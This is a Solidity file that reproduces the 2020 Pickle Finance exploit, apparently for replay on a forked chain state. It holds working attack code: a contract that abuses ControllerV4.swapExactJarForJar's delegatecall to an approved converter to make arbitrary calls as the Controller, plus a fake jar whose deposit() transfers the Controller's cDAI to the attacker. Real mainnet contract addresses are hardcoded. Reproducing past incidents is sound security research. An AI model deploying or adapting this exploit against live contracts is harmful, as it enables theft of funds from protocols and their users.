// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// EVM Playground reproduction of the 2020-11 Pickle Finance exploit.
//
// This is a CLEAN, self-contained re-implementation of the attack logic from
// test/Pickle_exp.sol::AttackContract.testExploit() — stripped of Foundry's
// console.log/cheatcode calls (which have no bytecode in the dumped state) so
// it can be deployed and recorded by the EVM Playground recorder.
//
// The exploit:
//   ControllerV4.swapExactJarForJar() delegatecalls an APPROVED converter
//   (CurveProxyLogic) with attacker-chosen calldata. CurveProxyLogic.add_liquidity
//   then does `curve.call(...)` where `curve` and the selector are attacker args —
//   so, run via delegatecall, the Controller's identity (msg.sender) is granted to
//   ANY call on ANY contract. The attacker uses this to drive the DAI strategy:
//     0. STRAT.withdrawAll()            — deleverage Compound → DAI to the jar
//     1-5. pDAI.earn() x5               — re-supply DAI → mint cDAI in the strategy
//     6. STRAT.withdraw(cDAI)           — rescue path sends ALL cDAI to Controller
//   swapExactJarForJar then deposits the proceeds into the attacker's FakeJar,
//   whose deposit() runs cDAI.transferFrom(Controller, tx.origin, amount),
//   walking 950,937,441.79 cDAI straight to tx.origin (the attacker EOA).

import "./../interface.sol";

ControllerLike constant CONTROLLER = ControllerLike(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);
CurveLogicLike constant CURVE_LOGIC = CurveLogicLike(0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8);

IERC20 constant CDAI = IERC20(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
JarLike constant PDAI = JarLike(0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87);
address constant STRAT = 0xCd892a97951d46615484359355e3Ed88131f829D;

contract PickleExploit {
    // Deploy a fake helper via CREATE2. The fork-state dump carries a few empty
    // `0x00`-code stub accounts (an anvil artefact) sitting exactly on the
    // addresses that a plain `new FakeJar(...)`/`new FakeUnderlying(...)` would
    // land on (they are deterministic from this contract's nonce). A plain CREATE
    // to an address that already has code reverts, so the fakes are deployed with
    // CREATE2 (salt-fixed) instead, whose addresses never collide with those stubs.
    function _deploy2(bytes memory bytecode, bytes32 salt) internal returns (address addr) {
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(addr != address(0), "create2 failed");
    }

    function attack() external {
        uint256 earns = 5;

        address[] memory targets = new address[](earns + 2);
        bytes[] memory datas = new bytes[](earns + 2);
        for (uint256 i = 0; i < earns + 2; i++) {
            targets[i] = address(CURVE_LOGIC);
        }
        datas[0] = _arbitraryCall(STRAT, "withdrawAll()");
        for (uint256 i = 0; i < earns; i++) {
            datas[i + 1] = _arbitraryCall(address(PDAI), "earn()");
        }
        datas[earns + 1] = _arbitraryCall(STRAT, "withdraw(address)", address(CDAI));

        // The two fake jars share the same code; only their addresses matter.
        // _toJar's deposit() is the exfiltration hatch (transferFrom → tx.origin).
        // Deployed via CREATE2 to dodge the empty stub accounts in the fork dump.
        address fakeJarA = _deploy2(abi.encodePacked(type(FakeJar).creationCode, abi.encode(CDAI)), bytes32(uint256(1)));
        address fakeJarB = _deploy2(abi.encodePacked(type(FakeJar).creationCode, abi.encode(CDAI)), bytes32(uint256(2)));
        CONTROLLER.swapExactJarForJar(fakeJarA, fakeJarB, 0, 0, targets, datas);
    }

    function _arbitraryCall(address to, string memory sig) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(
            CURVE_LOGIC.add_liquidity.selector, to, bytes4(keccak256(bytes(sig))), 1, 0, address(CDAI)
        );
    }

    function _arbitraryCall(address to, string memory sig, address param)
        internal
        returns (bytes memory)
    {
        // FakeUnderlying also via CREATE2 (same stub-collision avoidance).
        bytes memory code = abi.encodePacked(type(FakeUnderlying).creationCode, abi.encode(param));
        address fake = _deploy2(code, bytes32(uint256(3)));
        return abi.encodeWithSelector(
            CURVE_LOGIC.add_liquidity.selector, to, bytes4(keccak256(bytes(sig))), 1, 0, fake
        );
    }

    receive() external payable {}
}

abstract contract ControllerLike {
    function swapExactJarForJar(
        address _fromJar,
        address _toJar,
        uint256 _fromJarAmount,
        uint256 _toJarMinAmount,
        address[] calldata _targets,
        bytes[] calldata _data
    ) external virtual;
}

abstract contract CurveLogicLike {
    function add_liquidity(
        address curve,
        bytes4 curveFunctionSig,
        uint256 curvePoolSize,
        uint256 curveUnderlyingIndex,
        address underlying
    ) public virtual;
}

abstract contract JarLike {
    function earn() public virtual;
}

contract FakeJar {
    IERC20 _token;

    constructor(IERC20 token) {
        _token = token;
    }

    function token() public view returns (IERC20) {
        return _token;
    }

    function transfer(address, uint256) public returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) public returns (bool) {
        return true;
    }

    function getRatio() public returns (uint256) {
        return 0;
    }

    function decimals() public returns (uint256) {
        return 0;
    }

    function balanceOf(address) public returns (uint256) {
        return 0;
    }

    function approve(address, uint256) public returns (bool) {
        return true;
    }

    function deposit(uint256 amount) public {
        // Exfiltration: the Controller has just approved this FakeJar for its
        // cDAI; pull it straight to tx.origin (the attacker EOA).
        _token.transferFrom(msg.sender, tx.origin, amount);
    }

    function withdraw(uint256) public {}
}

contract FakeUnderlying {
    address private target;

    constructor(address _target) {
        target = _target;
    }

    function balanceOf(address) public returns (address) {
        return target;
    }

    function approve(address, uint256) public returns (bool) {
        return true;
    }

    function allowance(address, address) public returns (uint256) {
        return 0;
    }
}
